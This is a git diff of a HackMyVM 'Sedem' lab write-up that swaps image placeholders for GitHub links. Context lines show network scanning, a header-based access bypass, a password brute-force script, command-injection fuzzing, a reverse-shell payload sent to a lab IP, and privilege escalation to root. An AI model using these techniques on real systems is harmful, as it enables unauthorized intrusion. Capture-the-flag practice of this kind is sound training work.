@@ -1,5 +1,6 @@
 # HackMyVM — Sedem
 
+![NEE](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q1.png)
 ## Machine Information
 
 - **Machine:** Sedem
@@ -16,7 +17,7 @@ We are back with another HackMyVM challenge, this time targeting a Linux-based m
 
 Since the target IP was not immediately known, we used `netdiscover` to identify devices on the local network.
 
-![Netdiscover Output](URL 2)
+![Netdiscover Output](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q2.png)
 
 ```bash
 sudo netdiscover -i eth1
@@ -43,7 +44,7 @@ Target IP: 192.168.56.148
 
 We started with an all-port Nmap scan.
 
-![Nmap All Ports Scan](URL 3)
+![Nmap All Ports Scan](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q3.png)
 
 ```bash
 nmap -p- 192.168.56.148
@@ -59,7 +60,7 @@ PORT   STATE SERVICE
 
 Next, we performed service and version detection.
 
-![Nmap Service Detection](URL 4)
+![Nmap Service Detection](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q4.png)
 
 ```bash
 nmap -sC -sV -p 22,80 192.168.56.148
@@ -80,13 +81,13 @@ The target was running Linux, with SSH and an Apache web server exposed.
 
 We opened the web application in the browser and inspected the page.
 
-![Sedem Webpage](URL 5)
+![Sedem Webpage](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q5.png)
 
 The webpage displayed an image without much additional information. We also downloaded the image to inspect it, but this did not reveal anything useful.
 
 Next, we enumerated web directories using Gobuster.
 
-![Gobuster Results](URL 6)
+![Gobuster Results](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q6.png)
 
 ```bash
 gobuster dir -u http://192.168.56.148/ \
@@ -113,7 +114,7 @@ When examining `/sysadmin/`, we discovered that access was restricted based on t
 
 We tested the `X-Forwarded-For` HTTP header and found that setting it to the loopback address bypassed the restriction.
 
-![Burp Suite Response](URL 7)
+![Burp Suite Response](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q7.png)
 
 The important header was:
 
@@ -162,7 +163,7 @@ with open('/usr/share/wordlists/rockyou.txt', 'r') as file:
             break
 ```
 
-![Admin Password Found](URL 8)
+![Admin Password Found](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q8.png)
 
 The credentials discovered were:
 
@@ -179,7 +180,7 @@ Using these credentials, we gained access to the admin dashboard.
 
 After logging in, we inspected the page source and found an interesting comment.
 
-![Source Code Message](URL 9)
+![Source Code Message](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q9.png)
 
 ```html
 <!--
@@ -231,7 +232,7 @@ with requests.Session() as session:
             print(f"Fuzzed parameters: {counter}")
 ```
 
-![Command Injection Parameter](URL 10)
+![Command Injection Parameter](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q10.png)
 
 The fuzzing process helped identify a parameter that could be used to execute system commands through the application.
 
@@ -253,7 +254,7 @@ We then submitted the following payload through the vulnerable parameter:
 bash+-c+'exec+bash+-i+%26>/dev/tcp/192.168.56.106/4444+<%261'
 ```
 
-![Reverse Shell](URL 11)
+![Reverse Shell](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q11.png)
 
 The connection was received successfully:
 
@@ -297,7 +298,7 @@ We now had a more usable interactive shell.
 
 We enumerated the available users and checked the current account's sudo permissions.
 
-![Sudo Permissions](URL 12)
+![Sudo Permissions](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q12.png)
 
 ```bash
 sudo -l
@@ -357,7 +358,7 @@ chmod 600 id_decoded
 ssh -i id_decoded user1@192.168.56.148
 ```
 
-![User1 Shell](URL 15)
+![User1 Shell](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q15.png)
 
 ---
 
@@ -412,7 +413,7 @@ Output:
 user2
 ```
 
-![User2 Shell](URL 16)
+![User2 Shell](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q16.png)
 
 We had successfully escalated from `user1` to `user2`.
 
@@ -438,7 +439,7 @@ Our notes associated this hash with the Whirlpool algorithm and the candidate pa
 
 We used the recovered credential to access `user3`.
 
-![User3 Shell](URL 17)
+![User3 Shell](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q17.png)
 
 ---
 
@@ -516,7 +517,7 @@ Output:
 uid=1002(user3) gid=1002(user3) euid=0(root) egid=0(root) groups=0(root),1002(user3)
 ```
 
-![Root Shell](URL 19)
+![Root Shell](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q19.png)
 
 The effective UID was `0`, confirming that we had obtained root privileges.
 
